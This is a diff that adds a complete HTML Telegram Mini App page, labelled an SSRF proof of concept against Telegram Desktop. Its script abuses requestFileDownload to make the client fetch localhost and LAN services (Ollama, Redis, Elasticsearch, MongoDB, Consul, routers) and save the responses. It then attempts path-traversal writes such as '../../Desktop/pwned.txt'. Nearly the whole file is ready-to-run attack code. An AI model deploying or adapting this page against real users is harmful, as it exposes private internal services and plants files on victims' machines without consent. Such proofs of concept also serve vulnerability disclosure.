@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Telegram SSRF PoC</title></head>
+<body style="background:#000;color:#fff;font:14px monospace;padding:0;margin:0">
+
+<div id="out" style="padding:12px;white-space:pre-wrap"></div>
+
+<button onclick="startAll()" id="btn" style="margin:12px;padding:8px 16px;
+  font:16px monospace;background:#f44;color:#fff;border:none;cursor:pointer">
+  FIRE SSRF SCAN
+</button>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+const TW = window.Telegram.WebApp;
+TW.ready();
+TW.expand();
+
+const out = document.getElementById('out');
+function L(s) { out.textContent += s + '\n'; }
+
+L('=== Telegram Desktop SSRF via requestFileDownload ===');
+L('Target: localhost + LAN services');
+L('');
+
+const TARGETS = [
+  ['http://127.0.0.1:11434/api/tags',             'ollama.json',   'Ollama AI'],
+  ['http://127.0.0.1:7860/sdapi/v1/models',       'sd_models.json','SD WebUI'],
+  ['http://127.0.0.1:5000/',                      'flask.json',    'Flask dev'],
+  ['http://127.0.0.1:3000/',                      'next.json',     'Next.js dev'],
+  ['http://127.0.0.1:8080/',                      'tomcat.json',   'Tomcat'],
+  ['http://127.0.0.1:9200/',                      'elastic.json',  'Elasticsearch'],
+  ['http://127.0.0.1:27017/',                     'mongo.resp',    'MongoDB'],
+  ['http://127.0.0.1:6379/',                      'redis.resp',    'Redis'],
+  ['http://127.0.0.1:8500/v1/agent/members',      'consul.json',   'Consul'],
+  ['http://192.168.1.1/',                         'router.html',   'Router'],
+  ['http://192.168.0.1/',                         'router2.html',  'Router alt'],
+  ['http://localhost:5173/',                      'vite.html',     'Vite dev'],
+];
+
+let fired = 0;
+
+function fireNext() {
+  if (fired >= TARGETS.length) {
+    L(''); L('=== Scan complete. Check your Downloads folder. ===');
+    L('Any non-empty files = vulnerable internal service discovered!');
+    L(''); L('=== BUG: attach_bot_webview.cpp:3343 ===');
+    L('processDownloadRequest() - no URL validation');
+    L('_delegate->botDownloadFile() - passes raw URL to QNetworkAccessManager');
+    return;
+  }
+  const [url, name, desc] = TARGETS[fired];
+  L(`[${fired+1}/${TARGETS.length}] ${desc}: ${url}`);
+
+  if (TW.requestFileDownload) {
+    TW.requestFileDownload({url: url, file_name: name});
+  } else {
+    L('  [!] requestFileDownload not supported');
+  }
+  fired++;
+  setTimeout(fireNext, 800);
+}
+
+// Also demonstrate the path-traversal variant
+function doPathTraversal() { L(''); L('=== Path traversal in filename ===');
+  if (!TW.requestFileDownload) {
+    L('  [!] Not supported'); return;
+  }
+  const urls = [
+    ['https://example.com/index.html', '../../Desktop/pwned.txt'],
+    ['https://example.com/favicon.ico', '../AppData/Roaming/evil.ico'],
+  ];
+  for (const [url, name] of urls) {
+    L(`  Requesting: ${name}`);
+    TW.requestFileDownload({url, file_name: name});
+  }
+}
+
+function startAll() {
+  document.getElementById('btn').style.display = 'none';
+  fireNext();
+  setTimeout(doPathTraversal, 12000);
+}
+</script>
+</body>
+</html>
